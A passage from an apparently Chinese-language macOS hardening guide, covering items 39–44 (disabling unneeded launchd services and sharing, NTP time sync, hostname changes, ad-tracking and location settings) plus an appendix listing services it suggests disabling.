</p><p><strong>(39) 禁用不必要的服务（可选）</strong></p><p>管理员可以使用以下命令，禁用不必要的服务：</p><pre><code>sudo launchctl unload -w /System/Library/LaunchAgents/&lt;Service</code></pre><p>注意：这可能会破坏系统的原有功能。要重新加载这些服务，只需将上述命令中的“unload”替换为“load”。</p><p>我们在本文的最后，补充了一个可能是不必要服务的清单。</p><p>更多服务（Plistfiles）可以在以下目录中找到：</p><pre><code>/System/Library/LaunchDaemons/System/Library/LaunchAgents/Library/LaunchDaemons/Library/LaunchAgents/Users//Library/LaunchDaemons/Users//Library/LaunchAgents</code></pre><p><strong>(40) 禁用共享（重要）</strong></p><p>默认情况下，会禁用共享。管理员可以在这里进行验证：</p><p>点击“系统偏好设置” – “共享”，取消其中所有不需要的选项。</p><p><font color=red><strong><em>禁止共享</em></strong></font> </p><p><strong>(41) 通过NTP启用网络时间同步（重要）</strong></p><p>系统时钟对于日志文件来说非常重要。要确保时钟始终正确，并且未被损坏，可以使用以下命令：</p><pre><code>sudo systemsetup -setnetworktimeserver &quot;time.euro.apple.com&quot;sudo systemsetup -setusingnetworktime onecho &quot;restrict default ignore&quot; &gt;&gt; /etc/ntp.conf</code></pre><p><font color=red><strong><em>保证时钟同步争取，避免恶意病毒利用更改时间进行攻击</em></strong></font> </p><p><strong>(42) 计算机名/主机名（重要）</strong></p><p>建议平布主机名称，因为其中包含用户名和当前操作系统信息（MacBook → Mac OS）。因此，可以使用以下命令来更改通过网络显示的名称：</p><pre><code>sudo scutil --set ComputerName ExampleNamesudo scutil --set LocalHostName ExampleName</code></pre><p><font color=red><strong><em>不要在名字内透露出系统的信息</em></strong></font> </p><p><strong>(43) 限制广告追踪（重要）</strong></p><p>要限制设备的追踪，请禁用以下内容：</p><p>点击“系统偏好设置” – “安全和隐私” – “隐私” – “广告”（Advertising），选中“限制广告追踪”（Limit Ad Tracking）。</p><p><font color=red><strong><em>限制广告获取隐私信息</em></strong></font> </p><p><strong>(44) 追踪服务（重要）</strong></p><p>建议禁用追踪服务。如果用户决定使用追踪服务，则可以仅禁用Spotlight建议。</p><p>点击“系统偏好设置” – “安全和隐私” – “隐私” – “位置服务”（Location Services），选择“系统服务”（System Services） – 详细信息（Details），取消选中“Spotlight建议”（Spotlight Suggestions）。</p><p><font color=red><strong><em>不要轻易打开位置信息，存在被追踪的风险</em></strong></font> </p><p><strong>附录：建议禁用的服务清单</strong></p><p>下面列出了服务文件以及建议禁用的相应功能。如果没有特殊需要，不建议启用下面的服务。</p><pre><code>com.apple.AppleFileServer.plist  AFPftp.plist  FTPorg.apache.httpd.plist  HTTP Serverepcc.plist       Remote Apple Eventscom.apple.xgridagentd.plist       Xgridcom.apple.xgridcontrollerd.plist        Xgridcom.apple.InternetSharing.plist  Iternet Sharingcom.apple.dashboard.advisory.fetch.plist  Dashboard Auto-Updatecom.apple.UserNotificationCenter.plist     User notificationscom.apple.RemoteDesktop.PrivilegeProxy.plist       ARDcom.apple.RemoteDesktop.plist        ARDcom.apple.IIDCAssistant.plist      iSightcom.apple.blued.plist   Bluetoothcom.apple.RemoteUI.plist   Remote Controlcom.apple.gamed.plist        Game Center</code></pre>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
